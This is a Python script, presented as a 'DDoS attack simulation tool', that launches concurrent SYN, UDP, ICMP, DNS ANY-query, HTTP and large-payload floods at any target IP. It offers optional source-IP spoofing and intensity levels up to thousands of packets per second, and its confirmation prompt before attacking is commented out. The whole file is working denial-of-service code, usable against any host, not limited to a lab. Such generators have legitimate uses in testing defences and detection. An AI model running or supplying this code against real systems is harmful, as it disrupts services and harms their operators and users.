#!/usr/bin/env python3

import argparse
import random
import subprocess
import time
import threading
import logging
import string
from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, sr1, RandShort
import requests
import ipaddress

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('DDoS_Simulation')

class DDoSSimulator:
    def __init__(self, target_ip, duration=60, intensity='medium', port=80, spoof_ip=False):
        self.target_ip = target_ip
        self.duration = duration  # in seconds
        self.intensity = intensity
        self.target_port = port
        self.stop_flag = False
        self.spoof_ip = spoof_ip
        
        # Set packets per second based on intensity
        if intensity == 'low':
            self.packets_per_second = 500
        elif intensity == 'medium':
            self.packets_per_second = 2000
        elif intensity == 'high':
            self.packets_per_second = 5000
        else:
            self.packets_per_second = 2000  # Default to medium
            
        # Track running attacks
        self.active_threads = []
    
    def run_simulation(self):
        """Run the complete DDoS simulation with attack traffic along with benign packets"""
        logger.info(f"Starting DDoS simulation against {self.target_ip} for {self.duration} seconds")
        
        # Start all attack threads
        attack_threads = [
            threading.Thread(target=self.syn_flood),
            threading.Thread(target=self.udp_flood),
            threading.Thread(target=self.icmp_flood),
            threading.Thread(target=self.dns_amplification),
            threading.Thread(target=self.http_flood),
            threading.Thread(target=self.dummy_payload_attack), 
            threading.Thread(target=self.benign_traffic)
        ]
        
        # Start all threads
        for thread in attack_threads:
            thread.daemon = True
            thread.start()
            self.active_threads.append(thread)
        
        # Run for specified duration
        time.sleep(self.duration)
        
        # Signal threads to stop
        self.stop_flag = False
        logger.info("Stopping all attacks...")
        
        # Wait for threads to finish
        for thread in self.active_threads:
            thread.join(timeout=2)
        
        logger.info("DDoS simulation completed")
    
    def get_spoofed_ip(self):
        """Generate a random spoofed IP address"""
        if not self.spoof_ip:
            return None
        
        ip_range = random.choice([
            '10.0.0.0/8',       
            '172.16.0.0/12',    
            '192.168.0.0/16',   
            '1.0.0.0/8',        
            '2.0.0.0/8',        
            '5.0.0.0/8',        
        ])
        
        network = ipaddress.IPv4Network(ip_range)
        address_int = random.randint(
            int(network.network_address) + 1, 
            int(network.broadcast_address) - 1
        )
        spoofed_ip = str(ipaddress.IPv4Address(address_int))
        return spoofed_ip
    
    def generate_random_payload(self, size=None):
        """Generate random payload data of specified size"""
        if size is None:
            size = random.randint(32, 1024)  # Random size between 32 and 1024 bytes
            
        # Create random payload
        chars = string.ascii_letters + string.digits
        payload = ''.join(random.choice(chars) for _ in range(size)).encode()
        return payload
    
    def syn_flood(self):
        """SYN flood attack simulation with IP spoofing"""
        logger.info("Starting SYN flood attack")
        start_time = time.time()
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 5):  # Adjust packet rate
                    if self.stop_flag:
                        break
                    
                    # Create a SYN packet with optional spoofed source IP
                    sport = random.randint(1024, 65535)
                    spoofed_ip = self.get_spoofed_ip()
                    
                    if spoofed_ip:
                        packet = IP(src=spoofed_ip, dst=self.target_ip)/TCP(sport=sport, dport=self.target_port, flags="S")
                    else:
                        packet = IP(dst=self.target_ip)/TCP(sport=sport, dport=self.target_port, flags="S")
                    
                    # Send the packet
                    send(packet, verbose=0)
                
                # Sleep to control rate
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Error in SYN flood: {e}")
        
        logger.info("SYN flood attack completed")
    
    def udp_flood(self):
        """UDP flood attack simulation with IP spoofing and payload"""
        logger.info("Starting UDP flood attack")
        start_time = time.time()
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 10):
                    if self.stop_flag:
                        break
                    
                    # Generate random data and ports
                    data = self.generate_random_payload(random.randint(64, 512))
                    dport = random.randint(1, 65535)
                    sport = random.randint(1024, 65535)
                    spoofed_ip = self.get_spoofed_ip()
                    
                    # Create and send UDP packet
                    if spoofed_ip:
                        packet = IP(src=spoofed_ip, dst=self.target_ip)/UDP(sport=sport, dport=dport)/data
                    else:
                        packet = IP(dst=self.target_ip)/UDP(sport=sport, dport=dport)/data
                    
                    send(packet, verbose=0)
                
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Error in UDP flood: {e}")
        
        logger.info("UDP flood attack completed")
    
    def icmp_flood(self):
        """ICMP flood (ping flood) attack simulation with IP spoofing"""
        logger.info("Starting ICMP flood attack")
        start_time = time.time()
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 20):  # Lower rate for ICMP
                    if self.stop_flag:
                        break
                    
                    # Create and send ICMP echo request with payload
                    spoofed_ip = self.get_spoofed_ip()
                    payload = self.generate_random_payload(random.randint(32, 512))
                    
                    if spoofed_ip:
                        packet = IP(src=spoofed_ip, dst=self.target_ip)/ICMP()/payload
                    else:
                        packet = IP(dst=self.target_ip)/ICMP()/payload
                    
                    send(packet, verbose=0)
                
                time.sleep(0.05)
            except Exception as e:
                logger.error(f"Error in ICMP flood: {e}")
        
        logger.info("ICMP flood attack completed")
    
    def dns_amplification(self):
        """DNS amplification attack simulation with IP spoofing"""
        logger.info("Starting DNS amplification attack")
        start_time = time.time()
        dns_port = 53
        
        # List of domains to query for amplification
        domains = ["example.com", "google.com", "microsoft.com", "facebook.com", "amazon.com"]
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 5):  
                    if self.stop_flag:
                        break
                    
                    # Randomly select a domain
                    domain = random.choice(domains)
                    spoofed_ip = self.get_spoofed_ip()
                    
                    # Create DNS query packet (simulating amplification)
                    if spoofed_ip:
                        packet = IP(src=spoofed_ip, dst=self.target_ip)/UDP(sport=RandShort(), dport=dns_port)/\
                                DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                    else:
                        packet = IP(dst=self.target_ip)/UDP(sport=RandShort(), dport=dns_port)/\
                                DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                    
                    send(packet, verbose=0)
                
                time.sleep(0.05)
            except Exception as e:
                logger.error(f"Error in DNS amplification: {e}")
        
        logger.info("DNS amplification attack completed")
    
    def http_flood(self):
        """HTTP flood attack simulation"""
        logger.info("Starting HTTP flood attack")
        start_time = time.time()
        
        # List of common User-Agents for randomization
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
        ]
        
        # List of possible HTTP methods
        http_methods = ["GET", "POST", "HEAD"]
        
        # List of possible endpoints
        endpoints = ["/", "/index.html", "/login", "/api/data", "/search", "/images", "/contact"]
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 10):  # Adjust for HTTP requests
                    if self.stop_flag:
                        break
                    
                    # Randomize request parameters
                    method = random.choice(http_methods)
                    user_agent = random.choice(user_agents)
                    endpoint = random.choice(endpoints)
                    url = f"http://{self.target_ip}:{self.target_port}{endpoint}"
                    
                    headers = {
                        "User-Agent": user_agent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Connection": "keep-alive",
                        # Add random headers for more realistic traffic
                        f"X-Custom-{random.randint(1000, 9999)}": self.generate_random_payload(16).decode()
                    }
                    
                    if method == "POST":
                        post_data = {
                            f"param{random.randint(1, 10)}": self.generate_random_payload(random.randint(16, 64)).decode(),
                            f"data{random.randint(1, 10)}": self.generate_random_payload(random.randint(16, 64)).decode()
                        }
                    else:
                        post_data = None
                    
                    # Send HTTP request using requests library with timeout
                    if method == "GET":
                        requests.get(url, headers=headers, timeout=1, verify=False)
                    elif method == "POST":
                        requests.post(url, headers=headers, data=post_data, timeout=1, verify=False)
                    elif method == "HEAD":
                        requests.head(url, headers=headers, timeout=1, verify=False)
                
                time.sleep(0.05)
            except requests.exceptions.RequestException:
                # Expected to fail in most cases since target might not have HTTP server
                pass
            except Exception as e:
                logger.error(f"Error in HTTP flood: {e}")
        
        logger.info("HTTP flood attack completed")
    
    def dummy_payload_attack(self):
        """Send packets with large CharGens to consume bandwidth"""
        logger.info("Starting CharGen attack")
        start_time = time.time()
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                for _ in range(self.packets_per_second // 5):
                    if self.stop_flag:
                        break
                    
                    # Choose random protocol
                    protocol = random.choice(["tcp", "udp"])
                    
                    # Generate large CharGen
                    payload_size = random.randint(512, 8192)  # Between 512 bytes and 8KB
                    payload = self.generate_random_payload(payload_size)
                    
                    # Random source and destination ports
                    sport = random.randint(1024, 65535)
                    dport = random.randint(1, 65535)
                    
                    # Get spoofed IP
                    spoofed_ip = self.get_spoofed_ip()
                    
                    # Create and send packet
                    if protocol == "tcp":
                        if spoofed_ip:
                            packet = IP(src=spoofed_ip, dst=self.target_ip)/TCP(sport=sport, dport=dport)/payload
                        else:
                            packet = IP(dst=self.target_ip)/TCP(sport=sport, dport=dport)/payload
                    else:  # UDP
                        if spoofed_ip:
                            packet = IP(src=spoofed_ip, dst=self.target_ip)/UDP(sport=sport, dport=dport)/payload
                        else:
                            packet = IP(dst=self.target_ip)/UDP(sport=sport, dport=dport)/payload
                    
                    send(packet, verbose=0)
                
                time.sleep(0.067)  
            except Exception as e:
                logger.error(f"Error in CharGen attack: {e}")
        
        logger.info("payload attack completed")
    
    def benign_traffic(self):
        """Generate benign network traffic to mix with attack traffic"""
        logger.info("Starting benign traffic generator")
        start_time = time.time()
        
        while not self.stop_flag and (time.time() - start_time) < self.duration:
            try:
                # Generate some normal traffic patterns
                traffic_type = random.choice(["ping", "http", "dns"])
                
                if traffic_type == "ping" and random.random() < 0.7:
                    # Send a regular ping packet and wait for response
                    packet = IP(dst=self.target_ip)/ICMP()
                    sr1(packet, timeout=1, verbose=0)
                    time.sleep(random.uniform(0.5, 2.0))
                
                elif traffic_type == "http" and random.random() < 0.5:
                    # Normal HTTP GET request
                    try:
                        url = f"http://{self.target_ip}:{self.target_port}/"
                        requests.get(url, timeout=1, verify=False)
                    except requests.exceptions.RequestException:
                        pass
                    time.sleep(random.uniform(1.0, 3.0))
                
                elif traffic_type == "dns":
                    # Normal DNS query
                    dns_request = IP(dst=self.target_ip)/UDP(sport=RandShort(), dport=53)/\
                                DNS(rd=1, qd=DNSQR(qname="google.com"))
                    send(dns_request, verbose=0)
                    time.sleep(random.uniform(1.0, 2.0))
                
                # Add random delay between benign traffic events
                time.sleep(random.uniform(0.1, 0.5))
            
            except Exception as e:
                logger.error(f"Error in benign traffic: {e}")
        
        logger.info("Benign traffic generator completed")


def main():
    parser = argparse.ArgumentParser(description='DDoS Attack Simulation Tool')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('-i', '--intensity', choices=['low', 'medium', 'high'], default='medium',
                      help='Attack intensity (default: medium)')
    parser.add_argument('-s', '--spoof', action='store_true', help='Enable IP spoofing')
    
    args = parser.parse_args()
    
    print("""

       
 ____ ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ ____ ____ 
||A |||t |||t |||a |||c |||k |||       |||u |||n |||d |||e |||r |||w |||a |||y ||
||__|||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

    """)
    
    print(f"Target IP: {args.target_ip}")
    print(f"Target Port: {args.port}")
    print(f"Duration: {args.duration} seconds")
    print(f"Intensity: {args.intensity}")
    print(f"IP Spoofing: {'Enabled' if args.spoof else 'Disabled'}")
    
    # # Confirm before proceeding
    # confirm = input("\nDo you want to proceed with the attack simulation? (y/n): ").lower()
    # if confirm != 'y':
    #     print("Attack simulation aborted.")
    #     return
    
    # Run the simulation
    simulator = DDoSSimulator(
        target_ip=args.target_ip,
        duration=args.duration,
        intensity=args.intensity,
        port=args.port,
        spoof_ip=args.spoof
    )
    
    simulator.run_simulation()


if __name__ == "__main__":
    main()